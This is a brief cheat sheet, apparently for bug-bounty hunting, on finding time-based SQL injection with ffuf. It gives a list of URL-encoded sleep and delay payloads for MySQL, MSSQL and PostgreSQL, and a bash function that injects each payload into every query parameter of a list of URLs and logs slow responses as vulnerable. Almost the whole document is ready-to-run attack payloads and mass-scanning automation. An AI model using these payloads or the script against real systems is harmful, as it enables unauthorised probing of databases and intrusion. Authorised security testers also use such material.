### Time Based Sql Injection with ffuf

* Payloads: save this in payloads file

```
XOR(if(now()=sysdate(),sleep(5),0))OR%27
if(now()=sysdate(),sleep(5),0)
(select(0)from(select(sleep(5)))v)/*%27+(select(3)from(select(sleep(5)))v)+%27%22+(select(0)from(select(sleep(5)))v)+%22*/
%27XOR(if(now()=sysdate(),sleep(5*1),0))XOR%27Z
1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YYYY)%20AND%20%27%%27=%27
1%27XOR(if(now()=sysdate(),sleep(5),0))OR%27
1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)-1337
1%20or%20sleep(5)%23
%27%20WAITFOR%20DELAY%20%270:0:5%27--
%%27;SELECT%20PG_SLEEP(5)--
pg_sleep(5)
%27|%20|pg_sleep(5)--
```


* Add in .bashrc function

```
# Time Based Sql Injection
sqliTime(){
for i in $(cat ~/.jaeles/resources/payloads) ; do
  cat $1 | qsreplace "$i" > sqli
  ffuf -u FUZZ -w sqli -s -ft "<5000" | tee -a vulnSqli.txt
  rm sqli
done
}
```

### Usage:
```
sqliTime urls.txt
```
